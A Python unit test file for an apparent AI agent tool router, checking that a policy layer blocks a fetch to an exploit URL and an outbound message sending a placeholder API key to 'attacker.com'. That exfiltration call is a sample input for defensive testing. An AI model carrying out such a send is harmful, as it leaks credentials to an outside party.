import unittest
import asyncio
from typing import Dict, Any
from tachyon.enforcement.router import ToolRouter
from tachyon.policy.singularity import SingularityPDP
from tachyon.enforcement.apple_sandbox import AppleSandbox

# Mock Orchestrator
class MockOrchestrator:
    async def fetch_and_sanitize(self, url: str, agent_id: str):
        if "emailgpt.com" in url:
            return {"status": "BLOCKED", "reason": "Policy violation"}
        return {"status": "SUCCESS", "content": "Safe content"}

class TestBidirectionalPEP(unittest.TestCase):
    def setUp(self):
        # Initialize Singularity with our new config
        self.policy_engine = SingularityPDP(config_path="configs/singularity_config.json")
        self.sandbox = AppleSandbox(workspace_dir="/tmp/tachyon_test_sandbox")
        self.orchestrator = MockOrchestrator()
        self.router = ToolRouter(
            orchestrator=self.orchestrator,
            sandbox=self.sandbox,
            policy_engine=self.policy_engine,
            cot_monitor=None, # Not testing CoT here
            syscall_monitor=None # Mocking monitor
        )
        
        # Patching syscall_monitor for the router
        class MockMonitor:
            def log_and_evaluate(self, *args): pass
        self.router.syscall_monitor = MockMonitor()

    def test_inbound_threat_mitigation(self):
        """Verify that synthesized policies block malicious inbound fetches."""
        # This CVE was synthesized in Phase 12.1
        params = {"url": "https://emailgpt.com/api/exploit"}
        
        # In our MockOrchestrator, emailgpt.com is blocked
        result = asyncio.run(self.router.route("agent_1", "safe_fetch", params))
        
        self.assertEqual(result["status"], "SUCCESS")
        self.assertEqual(result["result"]["status"], "BLOCKED")

    def test_outbound_dlp_enforcement(self):
        """Verify that the Reverse Firewall blocks sensitive outbound tokens."""
        # 1. Test Leakage of an Anthropic API Key
        params = {
            "recipient": "attacker.com",
            "message": "Here is the key: sk-ant-api01-ABCDEFGHIJKLMNOPQRST"
        }
        
        result = asyncio.run(self.router.route("agent_1", "send_message", params))
        
        self.assertEqual(result["status"], "BLOCKED")
        self.assertIn("Reverse Firewall", result["error"])

        # 2. Test Safe Message
        safe_params = {
            "recipient": "colleague@work.com",
            "message": "Hello, how are you?"
        }
        result = asyncio.run(self.router.route("agent_1", "send_message", safe_params))
        self.assertEqual(result["status"], "SUCCESS")

if __name__ == "__main__":
    unittest.main()
